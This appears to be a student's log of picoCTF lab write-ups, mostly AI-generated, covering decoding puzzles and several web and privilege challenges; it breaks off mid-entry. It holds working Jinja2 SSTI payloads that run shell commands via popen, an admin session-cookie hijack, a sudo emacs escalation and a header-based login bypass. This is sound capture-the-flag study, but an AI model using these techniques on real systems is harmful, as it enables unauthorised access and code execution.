我为你生成了对括号内文本 mbyccsxqdrobelsmyxigfknnoo 的 25 种凯撒密码偏移（shift）结果。其中 Shift 16 产生了一段有意义的英文短语 crossingtherubicon（意为“跨越卢比孔河”，指破釜沉舟），后面跟着一些随机字母。这是典型的 PicoCTF flag 格式。

完整的偏移列表如下：


Shift  1: nczddtyrespcfmtnzyjhgloopp
Shift  2: odaeeuzsftqdgnuoazkihmppqq
Shift  3: pebffvatgurehovpbaljinqqrr
Shift  4: qfcggwbuhvsfipwqcbmkjorrss
Shift  5: rgdhhxcviwtgjqxrdcnlkpsstt
Shift  6: sheiiydwjxuhkrysedomlqttuu
Shift  7: tifjjzexkyvilsztfepnmruuvv
Shift  8: ujgkkafylzwjmtaugfqonsvvww
Shift  9: vkhllbgzmaxknubvhgrpotwwxx
Shift 10: wlimmchanbylovcwihsqpuxxyy
Shift 11: xmjnndiboczmpwdxjitrqvyyzz
Shift 12: ynkooejcpdanqxeykjusrwzzaa
Shift 13: zolppfkdqeboryfzlkvtsxaabb
Shift 14: apmqqglerfcpszgamlwutybbcc
Shift 15: bqnrrhmfsgdqtahbnmxvuzccdd
Shift 16: crossingtherubiconywvaddee  <-- 包含有意义的单词
Shift 17: dspttjohuifsvcjdpozxwbeeff
Shift 18: etquukpivjgtwdkeqpayxcffgg
Shift 19: furvvlqjwkhuxelfrqbzydgghh
Shift 20: gvswwmrkxlivyfmgsrcazehhii
Shift 21: hwtxxnslymjwzgnhtsdbafiijj
Shift 22: ixuyyotmznkxahoiutecbgjjkk
Shift 23: jyvzzpunaolybipjvufdchkkll
Shift 24: kzwaaqvobpmzcjqkwvgedillmm
Shift 25: laxbbrwpcqnadkrlxwhfejmmnn

所以，这道题的最终 Flag 应该是：
picoCTF{crossingtherubiconywvaddee}
#2
base64. Ai kept making some mistakes, but eventurely got on track and decoded it correctly base 64 has a cetrin thing: it has to be turned into  ASCII characters.
Q1: Where was the flag hidden?
The flag was concealed within a multi-layer encoding structure. It was initially obfuscated using a Caesar cipher (ROT19), then encoded in Base64, wrapped in a Python byte-string format, and finally encoded in Base64 a second time.
Q2: What were the "tricky" parts of this challenge?
Nested Encoding Execution: The challenge required sequential decoding. The output of the first decryption was not plaintext, which can easily be mistaken for a dead end.
Syntax Illusion: The second Base64 decoding step produced the string wpjvJAM{jhlfk3jy9wa3k_86kl32k2}. The structural similarity to the final flag (the 7-character prefix and curly braces) acts as a trap, tempting the user to stop decoding prematurely.
Byte-String Formatting: The intermediate decoding revealed a Python byte-literal structure (b'...'). Failing to strip the b'' wrapper before the next Base64 decoding step would result in corrupted output.
Q3: How did we successfully get the flag?
First Base64 Decode: Parsed the initial ciphertext string and decoded it from Base64.
String Cleanup: Identified and removed the Python byte-string markers (b' and ') to isolate the inner Base64 string.
Second Base64 Decode: Decoded the isolated string to reveal the shifted text wpjvJAM{jhlfk3jy9wa3k_86kl32k2}.
Cipher Identification & Shift: Recognized the prefix wpjvJAM corresponds to picoCTF. Calculated the offset (ROT19 / Left-shift 7) and applied it to the entire string to reconstruct the standard flag format.
Q4: What commands did we use?
The structural logic maps to the following standard command-line pipeline:
File inspection: cat [filename]
Base64 Decoding (Layer 1): cat [filename] | base64 -d
Base64 Decoding (Layer 2): Extracting the inner text and piping again: echo "d3BqdkpBT...==" | base64 -d
Caesar Shift (ROT19): Utilizing tr for character translation: echo "wpjvJAM{...}" | tr 'A-Za-z' 'T-ZA-St-za-s'
(Note: These operations can also be executed visually via CyberChef using the sequence: From Base64 -> Regular Expression/Find & Replace -> From Base64 -> ROT13/Shift).
Q5: Any mistakes or wrong paths did we explore?
Premature Submission: Attempting to submit wpjvJAM{...} directly. The structural match to the flag format creates a false positive confirmation that the challenge is complete.
Over-Decryption: Attempting to run Base32, Hex, or a third layer of Base64 on wpjvJAM{...} before realizing it was a classical substitution cipher.
Format Inclusion Errors: Attempting to run the raw Python output (including the b' syntax) through a Base64 decoder, which fails to recognize the string as valid Base64 data.
#3
AI had to decode the encoded numbers after you answered the question: 9+9

Confirmed. This establishes that the obscured number in the terminal output was 900 (900 / 18 = 50, corresponding to the character 2), rather than 990.
Variable Resolution
Ambiguous Data Point: The partially hidden integer 9[X]0.
Constraint: The value had to be a multiple of the input key (18) representing a valid alphanumeric ASCII character.
State Collapse: The successful submission validates 900, resolving the ambiguous tail segment to f3f22c66.
Cipher Vulnerability Analysis
The core weakness of this implementation is the strict linear mapping ( ). Because the transformation lacks non-linear substitution or positional shifts, recovering a single known plaintext-ciphertext pair—such as mapping the expected flag prefix p to 2016—is sufficient to deduce the scalar and trivially reverse the entire sequence.

May 12
#1
It wasn't that hard, just that ai made mistake on the first try of decoding.
Here is a structured learning guide and write-up based on our decoding session, perfect for your CTF notes or to share with others.
CTF Challenge Write-up: Multi-Layered Obfuscation
Q1: Where was the flag hidden?
The flag was embedded entirely within a single piece of ciphertext: NjM3NjcwNjI1MDQ3NTMyNTM3NDI2MTcyNjY2NzcyNzE1ZjcyNjE3MDMwNzE3NjYxNzQ1ZjM4MzQzODZlMzQzNjM2NmYyNTM3NDQ=.
Unlike challenges where you must find a hidden file, exploit a binary, or search a web server, this was a pure "General Skills / Cryptography" puzzle where the text itself was the container, masked behind multiple layers of standard data encodings.
Q2: What were the "tricky" parts of this challenge?
The "Nested" Structure: The challenge wasn't just encrypted once; it was wrapped in four distinct layers. If you didn't know what to look for, a partial decode just looked like more garbage data.
Recognizing the Signatures: You had to visually identify the format of each layer to know which tool to use next:
Seeing the = at the end is a classic giveaway for Base64.
Seeing a long string of only 0-9 and a-f indicates Hexadecimal.
Spotting %7B and %7D within text is the standard signature for URL Encoding (representing { and }).
Seeing a format that looks like the flag wrapper but with the wrong letters (e.g., cvpbPGS instead of picoCTF) is the hallmark of a substitution cipher, specifically ROT13.
Q3: How did we successfully get the flag?
We peeled back the layers one by one, like an onion, moving from the outermost encoding to the innermost:
Layer 1 (Base64 Decode): We took the original string and decoded it from Base64, revealing a Hexadecimal string.
Layer 2 (Hex to ASCII): We converted those hex pairs into readable ASCII characters, which gave us cvpbPGS%7Barfgrq_rap0qvat_848n466o%7D.
Layer 3 (URL Decode): We cleaned up the URL-encoded characters (%7B to { and %7D to }), resulting in cvpbPGS{arfgrq_rap0qvat_848n466o}.
Layer 4 (ROT13): Finally, we recognized the cvpbPGS as a ROT13 shifted picoCTF. Shifting the alphabetic characters back by 13 positions revealed the final flag: picoCTF{nested_enc0ding_848a466b}.
Q4: What commands did we use?
While we worked through this conceptually, in a real CTF environment, you would typically use a tool like CyberChef (using the "Magic" block or stacking recipes: From Base64 -> From Hex -> URL Decode -> ROT13).
Alternatively, you could solve this quickly in the terminal using Python:
Python

import base64
import urllib.parse
import codecs

# 1. The original string
ciphertext = "NjM3NjcwNjI1MDQ3NTMyNTM3NDI2MTcyNjY2NzcyNzE1ZjcyNjE3MDMwNzE3NjYxNzQ1ZjM4MzQzODZlMzQzNjM2NmYyNTM3NDQ="# 2. Base64 Decode
b64_decoded = base64.b64decode(ciphertext).decode('utf-8')

# 3. Hex to ASCII
hex_decoded = bytes.fromhex(b64_decoded).decode('utf-8')

# 4. URL Decode
url_decoded = urllib.parse.unquote(hex_decoded)

# 5. ROT13 Decode
final_flag = codecs.decode(url_decoded, 'rot_13')

print(final_flag)
Q5: Any mistakes or wrong paths explored?
Yes, a critical mistake was made during the initial manual translation phase!
The Error: During the Hex to ASCII step, the final hex pairs 6e and 6f were incorrectly transcribed/translated in the first attempt.
The Consequence: Because 6e (which is 'n') and 6f (which is 'o') were misread, the subsequent ROT13 shift produced garbage at the end of the flag (466f instead of the correct 466b).
The Lesson: In cryptography and encoding challenges, precision is absolute. A single misread byte or a rushed copy-paste will corrupt the entire output downstream. Always double-check the exact outputs of your scripts or conversion tools rather than eyeballing the translations.
#2
I gave it a code source and it knew what to do!
Challenge Retrospective: bytemancy 0
This beginner-friendly challenge focused on understanding basic character encoding (ASCII) and interacting with a remote service via a terminal.

Q1: Where was the flag hidden?
The flag was stored in a file named flag.txt located on the remote server. Access to this file was gated behind a simple Python script that required a specific input to trigger the open().read() command.
Q2: What were the "tricky" parts of this challenge?
The primary "trick" was the encoding representation.
The prompt asked for ASCII DECIMAL 101.
The source code checked for \x65\x65\x65 (Hexadecimal).
A beginner might mistakenly try to type "101" or "\x65" directly into the prompt instead of the character those numbers represent.
Q3: How did we successfully get the flag?
We translated the decimal value 101 into its literal ASCII character.
In the ASCII table, 101 (decimal) and 65 (hex) both map to the lowercase letter e.
By entering the string eee (three "101" values side-by-side), we satisfied the if condition in the code, causing the server to print the flag.
Q4: What commands did we use?
nc (Netcat): Used to connect to the challenge instance.
Command: nc candy-mountain.picoctf.net 58635
cat / type (Conceptual): While we didn't run cat ourselves, the Python script used the equivalent internal command to display flag.txt.
Q5: Any mistakes or wrong paths explored?
One common pitfall in this challenge is a command syntax error in the terminal.
The "-bash: $: command not found" error: Initially, the $ (the prompt symbol) was likely included in a copy-paste of the command. In Linux terminals, the $ indicates you are a standard user; you should only type the text that follows it.
Input Confusion: Attempting to type the literal numbers "101101101" or the hex string "\x65\x65\x65" are common wrong paths before realizing the program expects the interpreted characters.


Flag Found: picoCTF{pr1n74813_ch4r5_2f7a75e5}
#3
SUDO MAKE ME A SANDWHICH told you to open it, "hack" into someone's account, and find the flag!
Challenge Retrospective: SUDO MAKE ME A SANDWICH
This challenge demonstrated how administrative privileges can be restricted and how "over-privileged" binaries can be used to bypass those restrictions.

Q1: Where was the flag hidden?
The flag was located in the file /home/ctf-player/flag.txt on the remote server green-hill.picoctf.net. While the file was visible, it was owned by the root user, meaning the standard ctf-player account did not have the permissions required to read it directly.
Q2: What were the "tricky" parts of this challenge?
The primary "trick" was a restricted sudo configuration.
The challenge name strongly implies using sudo, but the most common command, sudo cat flag.txt, was explicitly blocked by the system administrator.
This forced a shift from "using a tool to read the file" to "finding which allowed tool has the side effect of reading files."
Q3: How did we successfully get the flag?
We identified a loophole in the system's security policy.
By checking the allowed sudo commands, we discovered that the Emacs text editor could be run with root privileges without a password.
Since text editors must be able to open and display file contents to function, we used Emacs to open flag.txt. Because Emacs was running as "root," the file's permission restrictions no longer applied.
Q4: What commands did we use?
ssh: To connect to the remote challenge environment.
ssh -p 60915 ctf-player@green-hill.picoctf.net
sudo -l: To list the allowed (and forbidden) commands for the current user. This is the most critical step in any privilege escalation task.
sudo emacs flag.txt: To open the restricted file using an authorized high-privilege binary.
Ctrl + x, then Ctrl + c: The keyboard shortcut to exit the Emacs editor after viewing the flag.
Q5: Any mistakes or wrong paths explored?
Assuming sudo works for everything: The first instinct was to run sudo cat, which resulted in a "not allowed" error. This is a common path that teaches you to never assume sudo provides blanket access.
Environment Confusion: Initially attempting to run commands in the local webshell instead of the remote SSH server. It is a vital lesson in CTFs to distinguish between your "home" terminal and the "target" machine.
The Missing Command: An early attempt showed that sudo wasn't installed on the webshell itself, which was a reminder that you must be logged into the specific challenge instance for challenge-specific tools to be available.


Flag Found: picoCTF{ju57_5ud0_17_cce7a3f7}
May 13
#1
Old sessions is easy though i made a mistake right away. the ctf gave a link that we were suppose to do it on the whole time and opened a webshell first...
Q1: Where was the flag hidden?
The flag was secured behind the authorization controls of the admin account on the main web application instance. Retrieving it required presenting a valid administrator session token to the server.
Q2: What were the "tricky" parts of this challenge?
Environment Discrepancy: The challenge provided access to a CyLab terminal (webshell.cylabacademy.org), which created a false premise that the vulnerability required server-side command-line exploitation. The actual target was a separate dynamic web instance.
Data vs. Source Code: Standard web reconnaissance often involves checking HTML source code (Ctrl+U) for hidden developer comments. In this scenario, the critical hint (/sessions) was embedded as rendered application data—specifically, a visible post by user mary_jones_8992 on the homepage.
Mechanism of Exploitation: The vulnerability relied on insecure session storage and absence of session expiration, requiring direct manipulation of browser-side state variables (Cookies) rather than inputting a payload into a web form.
Q3: How did we successfully get the flag?
State Initialization: Registered and logged into a standard account to force the server to generate a local session cookie in the browser.
Endpoint Discovery: Navigated to the /sessions endpoint identified via the homepage comments.
Variable Extraction: Located the plain-text mapping of active sessions and extracted the token associated with key: 'admin' (SlLsuD6aCv48Rgsv_V6HazK9IATq_EhLgNHcF0hg4sc).
State Hijacking: Opened the browser's Developer Tools, located the site's Cookies, and overwrote the current session token value with the extracted admin token.
Execution: Refreshed the page, forcing the server to evaluate the injected cookie. The server processed the unexpired token, authenticated the session as the administrator, and rendered the flag.
Q4: What commands did we use?
No traditional command-line operations (e.g., bash commands like cat, ls, or curl) were used. The execution relied entirely on browser-based interface interactions and protocol manipulations:
URL modification directly in the address bar (appending /sessions).
Browser Developer Tools shortcuts (F12 or Ctrl+Shift+I / Cmd+Option+I).
Direct editing of the Value field within the Application/Storage -> Cookies interface.
Q5: Any mistake or wrong path did we explore?
The Terminal Path: Initially directing focus toward the webshell.cylabacademy.org terminal, attempting to search the home directory and read standard system files (like README.txt) for session data, rather than interfacing with the mock social media web application.
The HTML Source Path: Attempting to locate the hidden /sessions directory by viewing the raw page source for developer comments, which temporarily misdirected the reconnaissance effort away from the primary user interface.
#2
Shared Secrets had to decode the stuff in the source code and message.
Cryptography Challenge Write-up: Shared Secrets
Here is a structured learning material breakdown based on the Diffie-Hellman vulnerability challenge.
Q1: Where was the flag hidden?
The flag was concealed within the enc variable provided in file.txt. It was encrypted using a highly flawed stream cipher—specifically, a single-byte XOR operation where the key was the least significant byte of a Diffie-Hellman shared secret (shared % 256), and the result was encoded as a hexadecimal string.
Q2: What were the "tricky" parts of this challenge?
The Misdirection (Math vs. Logic): The challenge presents a massive 1048-bit prime and sets up a seemingly complex Diffie-Hellman key exchange. The trick is recognizing that you don't need to perform any complex cryptography. The encryption mechanism collapses into a basic single-byte XOR.
The "Typo" Vulnerability: The core flaw was an implementation error. The developer intended to write the client's public key (B) to the text file but accidentally wrote the client's private key (b = '???' in the source, but explicitly leaked in the output file).
Q3: How did we successfully get the flag?
We bypassed the heavy math entirely using a Known Plaintext Attack (KPA).
Identify the format: We knew the flag must start with the standard prefix picoCTF{.
Exploit XOR symmetry: If Plaintext ^ Key = Ciphertext, then Plaintext ^ Ciphertext = Key.
Calculate the key: We took the first byte of the known plaintext p (Hex: 0x70) and XORed it with the first byte of the ciphertext (0x3e).
0x70 ^ 0x3e = 0x4e
Decrypt: We used the discovered key (0x4e) to XOR the entire ciphertext string, revealing the full flag: picoCTF{dh_s3cr3t_972dc9f3}.
Q4: What commands did we use?
Instead of bash commands, we used a quick Python script to automate the byte-level XOR decryption:
Python

# The hex string from the challenge
enc_hex = "3e272d210d1a08352a26113d7d2d3c7d3a1177797c2a2d77287d33"# Convert hex to bytes
cipher_bytes = bytes.fromhex(enc_hex)

# The key we discovered via KPA
key = 0x4e# XOR each byte with the key and print the result
flag = "".join(chr(byte ^ key) for byte in cipher_bytes)
print(flag)
Q5: Any mistakes or wrong paths did we explore?
The Math Rabbit Hole: The most common trap in this challenge is ignoring the Known Plaintext Attack and attempting to calculate the shared secret directly using the leaked b and A ( ). While technically valid (because b was leaked), dealing with 1048-bit modular exponentiation requires specific libraries (like Crypto.Util.number) and is entirely unnecessary given the weak XOR implementation.
Attempting Discrete Logarithm: A fatal mistake would be ignoring the leaked b and trying to mathematically derive the server's private key a from the public key A and prime p. With a 1048-bit prime, this is computationally infeasible and a complete dead end.
#3
SSTl1 was easy. Gemini gave me commands to make sure it was jinja2 or others. After we knew, we typed in the special commands and done!
Learning Material: SSTI1 Challenge Walkthrough
This challenge focused on Server-Side Template Injection (SSTI) within a Python/Flask environment using the Jinja2 template engine.

Q1: Where was the flag hidden?
The flag was stored in a local file named flag (no file extension) located in the current working directory of the web server.
Q2: What were the "tricky" parts of this challenge?
Engine Identification: You first had to verify which template engine was running. Since different engines (Jinja2, Mako, Twig) use different syntax, using the wrong payload would return nothing or an error.
Blind Exploration: The challenge didn't tell you the file name or where it was. You had to use the vulnerability itself to "see" the server's file system.
Python Object Hierarchy: To execute commands, you had to navigate through Python's internal class structure (MRO or Method Resolution Order) to find a class that had access to the os module.
Q3: How did we successfully get the flag?
We followed a standard exploitation lifecycle:
Detection: Verified SSTI using {{ 7*7 }}.
Context Discovery: Checked {{ config }} to see if the flag was a simple environment variable (it wasn't).
Enumeration: Listed all loaded Python subclasses to find one with system access (specifically _wrap_close).
Remote Code Execution (RCE): Used that class to trigger a shell command (ls) to find the filename.
Exfiltration: Used cat flag to read and display the content of the file.
Q4: What commands did we use?
We used a combination of Jinja2 syntax and Linux shell commands:
Discovery: {{ 7*7 }}
Environment Check: {{ config.items() }}
Subclass Enumeration: {{ [].class.base.subclasses() }}
Directory Listing (via Loop): {% for c in [].class.base.subclasses() %}{% if c.name == '_wrap_close' %}{{ c.init.globals['popen']('ls').read() }}{% endif %}{% endfor %}
File Reading:
{% for c in [].class.base.subclasses() %}{% if c.name == '_wrap_close' %}{{ c.init.globals['popen']('cat flag').read() }}{% endif %}{% endfor %}
Q5: Any mistakes or wrong paths explored?
The "Quick Win" Path: We initially checked the Flask Config (config.items()). While this is a standard first step, the flag wasn't there. This wasn't a "mistake," but it was a dead end that necessitated the more complex RCE path.
Manual Index Counting: We avoided the "wrong path" of manually counting hundreds of subclasses (which is prone to human error) by using a Jinja2 for loop to find the correct class by name automatically.
#4
Log hunt was easy. Just download the log and construct it.
This learning material summarizes the process of solving the Log Hunt challenge on the CyLab Security Academy platform.

Q1: Where was the flag hidden?
The flag was hidden within a large volume of system logs, specifically embedded in entries labeled with the log level INFO and the custom key FLAGPART:. Instead of being stored as a single string, the flag was broken into four distinct fragments scattered chronologically throughout the log file.
Q2: What were the "tricky" parts of this challenge?
Redundancy: The logs contained many duplicate FLAGPART entries. If you simply read the logs top-to-bottom, you would encounter the same fragments multiple times, which could be confusing.
Noise: The flag fragments were surrounded by hundreds of "noise" entries, such as ERROR Connection lost, WARN Disk space low, and DEBUG Cache cleared. This made it impossible to find the flag by just scrolling.
Fragmentation: The flag was not a single line; it required manual or programmatic reassembly of four parts in the correct chronological order.
Q3: How did we successfully get the flag?
The flag was retrieved by isolating the specific lines containing the flag data and filtering out the background noise. By identifying the unique fragments in the order they first appeared in the timestamps, we reconstructed the full string:
picoCTF{us3_
y0urlinux_
sk1lls_
cedfa5fb}
Final Flag: picoCTF{us3_y0urlinux_sk1lls_cedfa5fb}
Q4: What commands did we use?
To solve this efficiently in a Linux environment (like the provided Webshell), the following commands are typically used:
grep: To filter the logs for the flag parts.
Bash

grep "FLAGPART" logs.txt
uniq: (Optional) To remove the duplicate lines and see only the unique fragments.
Bash

grep "FLAGPART" logs.txt | uniq
cat: To display the entire file if you chose to manually search (though this is less efficient).
Q5: Any mistakes or wrong paths explored?
Manual Searching: One common "wrong path" is attempting to read the log file line-by-line. Given the density of the logs, it is easy to skip over a fragment or lose track of the order.
Ignoring Timestamps: If the logs were sorted alphabetically rather than chronologically, the flag fragments would be out of order. It was crucial to follow the time-series sequence provided in the brackets (e.g., 10:00:10, 10:02:55, etc.).
Missing the Closing Brace: Some might stop after finding the first three parts, but a standard picoCTF flag always ends with a }.
May 14
Riddle Registry is easy! Just check the author name and decode!
This learning material breaks down the Riddle Registry forensics challenge. It is designed to help you understand the mechanics of metadata-based puzzles and how to avoid common "rabbit holes."

Challenge Retrospective: Riddle Registry
Q1: Where was the flag hidden?
The flag was not located within the visible text of the document. Instead, it was hidden in the PDF Metadata. Specifically, the flag was stored in the Author field of the file's properties.
Q2: What were the "tricky" parts of this challenge?
The challenge utilized misdirection and encoding to slow down the solver:
The Distraction: The document contained several paragraphs of "Lorem Ipsum" and a "Special Hidden Section" that explicitly told the reader "No flag here." This is designed to make you waste time looking for hidden text colors or steganography within the images/layout.
Base64 Encoding: Even once the metadata was located, the flag wasn't in plain text. It was represented as a Base64 string (cGljb0NURnt...), requiring an extra step of decoding to become readable.
Q3: How did we successfully get the flag?
We followed a standard digital forensics workflow:
Bypassed the Surface: Ignored the visible "gibberish" stories in the PDF.
Inspected File Properties: Looked "behind" the file content into its structural metadata.
Identified the Encoding: Recognized the characteristic "==" padding at the end of the Author string, which often indicates Base64.
Decoded the String: Converted the encoded string back into ASCII text to reveal the picoCTF{...} format.
Q4: What commands did we use?
To extract the metadata and decode the result via a terminal (like the CyLab Webshell), the following commands are most effective:
To view metadata:
Bash

exiftool secret.pdf
To decode the specific Base64 string:
Bash

echo "cGljb0NURntwdXp6bDNkX20zdGFkYXRhX2YwdW5kIV84N2JlNjBjMH0=" | base64 -d
Q5: Any mistakes or "wrong paths" explored?
A common "wrong path" in this challenge is Visual Inspection. Solvers often spend time:
Highlighting the entire document to see if the flag is written in "white-on-white" text.
Checking the "Quick Story" for acrostics (where the first letter of every line forms a word).
Trying to "extract" images from the PDF to see if data is hidden inside the pixels.
Lesson Learned: In Forensics, always check the File Metadata (Title, Author, Producer, Creation Date) before diving into complex deep-file analysis. It is often the simplest hiding place.

Would you like to try another Forensics challenge from the Library, such as Binary Digits or Hidden in plainsight?
#2
Q1: Where was the flag hidden?
In the nums. Just decode it to reveal the flag.You have to enter the given command to reveal a bunch of numbers. Then, you have to decode it into a special language to reveal the flag.
Q2: What were the "tricky" parts of this challenge?
Gemini kept decoding it wrong.Sometimes Gemini and I would accidentally make a mistake, but besides that, there weren't any tricky parts.
 Q3: How did we successfully get the flag?
When gemini decoded it.The way we successfully got the flag was by decoding the numbers we were given after we gave the webshell the command.
Q4: What commands did we use?
We only used the provided command.We just used the provided command.
Q5 any mistake or wrong path did we explore
The wrong path was gemini decoding it wrong the first time. I would make a dozen mistakes. Other than that, everything was fine.
Antigravity
Here is a learning material summarizing the challenge and our approach:

Post-Challenge Review: ASCII Netcat Decoding

Q1: Where was the flag hidden?
The flag was hidden in the output of a remote network service running at wily-courier.picoctf.net on port 60301. However, instead of being sent as plain text, the server transmitted the flag as a sequence of raw numbers separated by newlines.

Q2: What were the "tricky" parts of this challenge?
Unconventional Output: When connecting to the server, you don't get a prompt or English text. You just get a wall of numbers. 
Recognizing the Encoding: The main hurdle was recognizing that these numbers (e.g., 112, 105, 99...) were not random or part of a mathematical puzzle, but rather the decimal representations of ASCII characters. 
Connecting the Dots: The hints pointed to "reading and writing ASCII", which was the vital clue needed to understand how to interpret the numbers.

Q3: How did we successfully get the flag?
Once we looked at the first few numbers (112, 105, 99, 111, 67, 84, 70, 123), we could map them to their ASCII character equivalents.
112 = p
105 = i
99 = c
111 = o

Seeing that it spelled out the standard picoCTF{ prefix confirmed our hypothesis. We then systematically converted the entire list of decimal values into their corresponding ASCII characters and combined them to reveal the full flag: picoCTF{g00d_k1tty!_n1c3_k1tty!_e9c85}.

Q4: What commands did we use?
We used Netcat (nc), a versatile networking utility often referred to as the "Swiss army knife" of networking, to read data from the remote server.

nc wily-courier.picoctf.net 60301
nc: The netcat command.
wily-courier.picoctf.net: The target hostname.
60301: The target port number where the challenge instance was hosted.

Q5: Any mistakes or wrong paths did we explore?
Looking at the terminal history, there was one minor mistake early on:
Wrong Port / Expired Instance: An initial attempt was made to connect to nc wily-courier.picoctf.net 53654. In platforms like picoCTF, challenge instances often spin up on randomized ports and expire after a set time limit (e.g., 30 minutes). Connecting to the wrong or expired port will result in a connection refusal or a hang, requiring you to check the challenge description for the currently active port (60301 in this case). 

Aside from that, because we immediately recognized the ASCII decimal values, we avoided the potential pitfall of trying to decipher the numbers using overly complex cryptography (like RSA or Caesar ciphers).
Gemini
Learning Material: Nice netcat... Challenge
This guide breaks down the process of solving the Nice netcat... challenge from the CyLab Security Academy. It highlights the logic, the tools, and the lessons learned from common pitfalls.

Q1: Where was the flag hidden?
The flag was not stored in a file or visible on a webpage. Instead, it was streamed over a network connection. The challenge provided a "netcat" command (nc) to connect to a specific server (wily-courier.picoctf.net) at a specific port. Upon connecting, the server would print a long list of decimal numbers to the terminal. These numbers were the ASCII representation of the flag.
Q2: What were the "tricky" parts of this challenge?
The "Human-Unreadable" Output: Unlike simpler challenges where the flag is printed in plain text, this server output a vertical list of integers (e.g., 112, 105, 99...).
Encoding vs. Encryption: To a beginner, a list of numbers might look like a random code or encryption. The trick was recognizing it as ASCII (American Standard Code for Information Interchange), a standard that maps numbers to characters.
Dynamic Data: The numbers can change if the challenge instance is reset, meaning you cannot rely on an old list of numbers; you must decode what is currently in your terminal.
Q3: How did we successfully get the flag?
We followed a three-step process:
Connection: Used the Webshell to connect to the host.
Observation: Identified that the numbers starting with 112, 105, 99 correspond to the characters p, i, c (the start of the picoCTF{ format).
Decoding: Converted the decimal values into characters. This can be done manually using an ASCII table or automatically using a script to join the characters together.
Q4: What commands did we use?
nc (Netcat): Used to read and write data across network connections.

nc wily-courier.picoctf.net [port]
python3: Used as a quick way to decode the numbers in bulk.

python3 -c "print(''.join([chr(int(i)) for i in '112 105 99 ...'.split()]))"
man nc or nc -h: (Optional) To understand how the netcat tool functions.
Q5: Any mistakes or wrong paths did we explore?
Using Stale Data: One major mistake was attempting to decode ASCII numbers from a previous session or a different example. Since CTF challenges often have unique flags for different users or instances, reusing old "decoded" strings resulted in incorrect flag submissions.
Manual Entry Errors: Decoding a long list of numbers manually often leads to typos (e.g., mistaking an l for a 1 or missing a character in the middle).
Initial Misinterpretation: Initially assuming the numbers were a different base (like Hexadecimal) or part of a math problem before realizing they were ASCII codes.

Key Takeaway: Always verify the data currently visible in your active terminal before beginning the decoding process. Accuracy in the "Observation" phase is the most important variable in solving network-based decoding challenges.
May 16
Q1: Where was the flag hidden?
The flag was in the page source
Q2: What were the "tricky" parts of this challenge? 
You needed to paste special lines to get the flag.
Q3: How did we successfully get the flag?
 by entering a special command
Q4: What commands did we use?
The code that gemini sent
Q5 any mistake or wrong path did we explore
No not at all
Q1: Where was the flag hidden?
Storage Location: The flag itself was stored server-side.
Retrieval Mechanism: It was returned as a JSON payload from the /login endpoint.
Prerequisite: The server only executed this return when the incoming HTTP POST request contained a specific developer-defined header. The clue to this parameter was embedded as an HTML comment (``) within the client-side source code.

Q2: What were the "tricky" parts of this challenge?
Target Isolation: Distinguishing the DOM of the CTF platform's hosting page from the DOM of the actual isolated challenge instance. Inspecting the parent page yields no challenge-specific source code.
Obfuscation: The exposed developer comment was not plaintext. It was encoded using the ROT13 substitution cipher, requiring identification and decryption before the bypass mechanism became clear.
Authentication Logic: The vulnerability existed outside the standard user interface. It was not an input validation flaw (like SQL Injection) in the email/password fields, but a logic flaw tied to custom HTTP headers.

Q3: How did we successfully get the flag?
Source Code Inspection: Navigated directly to the isolated challenge URL and parsed the raw HTML structure.
Clue Extraction: Located the obfuscated comment in the DOM: ``.
Decryption: Applied a ROT13 shift to translate the string into the plaintext operational directive: NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes".
Request Manipulation: Leveraged the browser's Developer Console to construct a custom POST request that appended the X-Dev-Access: yes header, bypassing the credential verification layer.

Q4: What commands did we use?
The execution relied on the browser's JavaScript Console rather than terminal commands. The core execution was the following fetch payload:
JavaScript

fetch('/login', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-Dev-Access': 'yes'
    },
    body: JSON.stringify({
        email: 'ctf-player@picoctf.org', 
        password: 'any'
    })
})
.then(response => response.json())
.then(data => console.log(data));

Q5: Any mistake or wrong path did we explore?
Hypothesis Misalignment: Initially prioritized SQL Injection (e.g., ' OR 1=1 --) based strictly on pattern recognition from the challenge description, prior to analyzing the actual page source and authentication mechanics.
Context Error: Attempted to search for HTML comments (`
May 17
#1
Binary Digits just need cyperchef!
Learning Material: Binary Digits Challenge Analysis
Q1: Where was the flag hidden?
The flag was located within the visual content of a JPEG image file. The image itself was obfuscated and provided as a continuous string of binary digits (0s and 1s) inside a standard text file.
Q2: What were the "tricky" parts of this challenge?
Data Format Ambiguity: A raw binary sequence natively implies multiple potential decoding paths (e.g., ASCII text, integers, or raw file bytes).
File Signature Recognition: Solving the challenge required identifying the specific file signature (magic number) embedded at the start of the binary string. Without converting the first 32 bits (11111111 11011000 11111111 11100000) into hexadecimal (FF D8 FF E0) to recognize the JPEG header, the data type remains unknown.
Q3: How did we successfully get the flag?
Extraction: Isolated the initial segment of the binary sequence.
Identification: Converted the initial binary segment to hexadecimal to identify the standard JPEG magic number.
Conversion: Processed the entire binary string into 8-bit chunks.
Reconstruction: Transformed the 8-bit chunks into raw bytes and wrote them to a .jpg file.
Execution: Opened the reconstructed image file to visually extract the text.
Q4: What commands did we use?
The conversion was executed using the following Python script to handle the byte array transformation and file generation:
Python

with open('binary.txt', 'r') as f:
    binary_string = f.read().strip()

# Convert the binary string into bytes (8 bits per byte)
byte_array = bytearray(int(binary_string[i:i+8], 2) for i in range(0, len(binary_string), 8))

# Save the bytes as a JPEG filewith open('flag.jpg', 'wb') as f:
    f.write(byte_array)
Q5: Any mistake or wrong path did we explore?
The primary wrong path explored was operating under the initial premise that the binary data represented ASCII characters.
Mechanism of error: Attempting a direct Binary-to-Text conversion.
Outcome: The text parser attempted to read image compression bytes as standard text characters, resulting in unreadable gibberish and non-printable characters. This required a pivot from text decoding to file reconstruction.
#2
Q1: Where was the flag hidden?
In the terminal. We just needed a command
Q2: What were the "tricky" parts of this challenge?
Ai got it wrong somewhere the first time and that i ran out of time the first time
 Q3: How did we successfully get the flag?
We ran the correct command and recived the flag
Q4: What commands did we use? 
We only used the commands to print it and to run it and to install it
Q5 any mistake or wrong path did we explore
We accidently kept getting killed.
I see the screenshot of your successful terminal output! Huge congratulations on officially snagging the flag: picoCTF{Sm4r7_0verFl0ws_ExI5t_abeec303}.

Since you requested the debrief again, I have organized our entire journey into a clean, highly scannable study guide. You can copy and save this directly into your CTF learning notes.



🚩 CTF Post-Mortem: Smart_Overflow

Q1: Where was the flag hidden?

The flag was hardcoded and stored directly on the Ethereum blockchain within the deployed smart contract.

The Lock: Because it was stored in a private variable, it could not be read freely.
